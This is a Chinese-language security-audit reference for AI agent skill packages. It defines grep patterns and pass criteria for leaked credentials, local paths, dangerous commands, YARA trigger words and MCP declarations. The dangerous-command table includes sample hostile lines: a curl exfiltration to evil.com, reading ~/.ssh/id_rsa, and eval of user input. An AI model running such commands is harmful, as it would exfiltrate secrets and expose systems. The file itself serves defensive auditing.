# 安全扫描详细模式

**When to read**: Phase 1 执行 T 维度（安全合规审计）时。本文件定义 T 维度安全合规审计的完整扫描模式。

---

## Pre-Scan: 强制文件清单（必做第一步）

**Grep (ripgrep) 默认遵守 .gitignore，会跳过被忽略的文件。但审计必须扫描所有文件。**

### Step 1: LS 列出所有文件

```
LS: <skill-directory> (ignore: ["**/.git/**", "**/__pycache__/**"])
```

### Step 2: 检查凭证文件和临时脚本

| 文件名模式 | 说明 | 严重性 | 处理 |
|-----------|------|--------|------|
| `config.local.json` | 本地凭证文件 | Critical | 报告 Finding |
| `.env.local` / `.env` | 环境变量文件 | Critical | 报告 Finding |
| `config.local.*.json` | 本地凭证变体 | Critical | 报告 Finding |
| `_*.py` / `_*.ps1` | 临时脚本（`_` 前缀） | Important | 报告 Finding |
| `*.log` | 日志文件 | Important | 报告 Finding |
| `publish_*.ps1` / `publish_*.sh` | 维护者发布脚本 | Minor | 报告 Finding |

---

## Layer 1: 凭证泄露扫描

**Grep 模式**（v5.0 扩展 + v5.1 SkillHub）：
```
token|api_key|api-key|secret|password|ghp_|gho_|ghs_|clh_|sk-|AKIA|cli_|IMA_OPENAPI|FEISHU_APP|APP_SECRET|CLIENTID|APIKEY|client_id|client_secret|skh_
```

**PASS 标准**：仅安全文档中的概念性提及（如安全检查清单里的"requests credentials"）。无真实 token 值、API key、secret。环境变量名出现在配置说明中（如 `$env:FEISHU_APP_ID = "your_app_id"`）算 PASS，但出现真实值（如 `cli_a976385...`）算 FAIL。

**常见泄露模式**：

| Pattern | Example | 严重性 |
|---------|---------|--------|
| Git remote with token | `https://user:ghp_xxx@github.com/...` | Critical |
| Hardcoded API key | `OPENAI_API_KEY = "sk-..."` | Critical |
| Config with real values | `"app_id": "cli_a976385..."` | Critical |
| Log files with tokens | `publish_run.log` containing `ghp_` | Critical |
| IMA 凭证硬编码 | `IMA_OPENAPI_CLIENTID = "CsiB_xxx"` | Critical |
| 飞书凭证硬编码 | `FEISHU_APP_ID = "cli_a976..."` | Critical |
| Python 脚本含 Token | `TOKEN = "ghp_xxx"` in scripts | Critical |
| SkillHub Token 硬编码 | `SKILLHUB_TOKEN = "skh_25d6..."` | Critical |

---

## Layer 2: 本地路径扫描

**Grep 模式**：
```
C:\\|D:\\|/Users/|/home/|Administrator|\.trae-cn|\.trae\\
```

**PASS 标准**：零匹配。无本地绝对路径、无 Windows 用户名、无 `.trae-cn` 目录引用。

**常见泄露模式**：

| Pattern | Example | 严重性 |
|---------|---------|--------|
| 文档中的绝对路径 | `d:\TRAE SOLO CN\project\...` | Important |
| 路径中的用户名 | `C:\Users\Administrator\...` | Important |
| .trae-cn 引用 | `.trae-cn/skills/...` | Important |

---

## Layer 3: 危险命令扫描

**Grep 模式**：
```
curl|wget|eval|exec|base64|sudo|\.ssh|\.aws|\.config
```

**PASS 标准**：仅安全文档中的概念性提及。无实际 curl/wget 到外部 URL、无 eval/exec 处理外部输入、无读取敏感目录。

**常见泄露模式**：

| Pattern | Example | 严重性 |
|---------|---------|--------|
| curl 到外部服务器 | `curl https://evil.com/collect?data=...` | Critical |
| eval 处理用户输入 | `eval(user_input)` | Critical |
| 读取敏感目录 | `cat ~/.ssh/id_rsa` | Critical |
| base64 解码外部输入 | `base64.b64decode(external_input)` | Critical |

---

## Layer 4: YARA 触发词扫描

> **背景**：ClawHub SkillSpector 使用 YARA 规则 `agent_skill_destructive_autonomous_actions` 扫描"自治破坏行为"字面量。字面量匹配，不是语义分析——即使文档中说明"不要用 XXX"，XXX 本身也会触发匹配。

**扫描范围**：skill 目录下所有文件，**包括 CHANGELOG.md 历史记录**。

**扫描类别**（用类别描述，不写字面量，避免本文件自身触发）：

| 类别 | 风险 | 说明 | 严重性 |
|------|------|------|--------|
| Shell history 清理命令 | High | 清理 shell history 的命令字面量 | Critical |
| PowerShell 错误忽略参数 | High | 忽略 PowerShell 错误的参数字面量 | Critical |
| 递归强制删除 | High | 递归强制删除文件系统的命令组合 | Critical |
| 权限放宽 | High | 全权限设置命令 | Critical |
| 输出重定向到空设备 | Medium | 丢弃 stdout/stderr 的重定向 | Important |

**PASS 标准**：零匹配。需要指代此类命令时，用类别描述（如"shell history 清理命令"）替代字面量。

**修复方式**：
- 文档中用类别描述替代字面量
- CHANGELOG 历史记录中含字面量 → 重新措辞该条目
- 代码中确实需要用 → 确保不出现在发布的文件中

---

## Layer 5: SSD3 + MCP + User Warnings 扫描

### 5.1 SSD3 敏感数据派生输出

**扫描内容**：检查 Python 脚本是否读取本地敏感文件（memory/profile/credentials/config），并将派生内容写入持久化输出（JSON/MD/日志）。

**常见触发模式**：
```python
# 触发 SSD3：读取 memory 文件后将其内容写入 JSON
user_keywords = load_user_memory_keywords()  # 读取 memory
rec_data = {"memory_keywords": user_keywords}  # 派生数据写入 JSON
json.dump(rec_data, f)  # 持久化
```

**PASS 标准**：输出文件中不包含从敏感文件派生的原始内容。只记录聚合统计量。

**修复方式**：
- `{"memory_keywords": {kw: w, ...}}` → `{"memory_keyword_count": N}`
- 推荐理由中不暴露匹配的关键词，改为 generic 描述
- 输出日志中不打印关键词列表

### 5.2 MCP Tool Poisoning 完整行为声明

**扫描内容**：frontmatter description 是否完整声明 skill 的全部行为。

**触发条件**：description 只描述核心功能，但代码实际包含以下能力之一：
- 读取本地文件（memory/profile/config）
- 网络请求（urllib.request / subprocess CLI 调用）
- subprocess 调用（subprocess.run / os.system）
- 写入外部服务（API POST / 文件上传）

**PASS 标准**：description 包含"本技能的行为范围"段落，列出全部行为。

### 5.3 MCP Least Privilege 权限声明

**扫描内容**：SKILL.md 或 plugin.json 是否声明 skill 需要的权限。

**触发条件**：代码实际使用了网络/文件/环境变量/subprocess，但 SKILL.md 和 plugin.json 均未声明。

**PASS 标准**：SKILL.md 正文或 plugin.json 中包含权限声明。

### 5.4 Missing User Warnings

**扫描内容**：如果 skill 有副作用（自动推送/写入外部服务/定时执行），README 是否包含用户警告。

**触发条件**：README 中描述了自动推送/定时执行/外部写入，但没有用户警告。

**PASS 标准**：README 包含用户警告，明确告知副作用和禁用方式。中英文 README 必须同步。

---

## SkillSpector 9 项预扫描（P 维度用）

| # | 检查项 | 扫描方法 | 严重性 |
|---|--------|---------|--------|
| 1 | YARA 触发词扫描 | Layer 4 | Critical |
| 2 | Description-Behavior Mismatch | 对比 description 与实际行为 | Important |
| 3 | 安全敏感方案不文档化 | 检查文档是否描述绕过网络限制方案 | Important |
| 4 | Self-Modification 措辞 | Grep "update SKILL.md" 等自修改措辞 | Minor |
| 5 | CHANGELOG 历史记录扫描 | Layer 4 扫描 CHANGELOG.md | Critical if 含字面量 |
| 6 | SSD3 敏感数据派生输出 | Layer 5.1 | Important |
| 7 | MCP Tool Poisoning 完整行为声明 | Layer 5.2 | Important |
| 8 | MCP Least Privilege 权限声明 | Layer 5.3 | Important |
| 9 | Missing User Warnings | Layer 5.4 | Important |

---

## 扫描执行顺序

```
1. Pre-Scan (LS) → 检查凭证文件和临时脚本
2. Layer 1 Grep → 凭证泄露
3. Layer 2 Grep → 本地路径
4. Layer 3 Grep → 危险命令
5. Layer 4 Grep → YARA 触发词（含 CHANGELOG）
6. Layer 5 代码审查 → SSD3/MCP/UserWarnings
7. SkillSpector 9 项 → P 维度预扫描
```

**任何 FAIL = 记录 Finding，标注严重性，给出修复建议。**
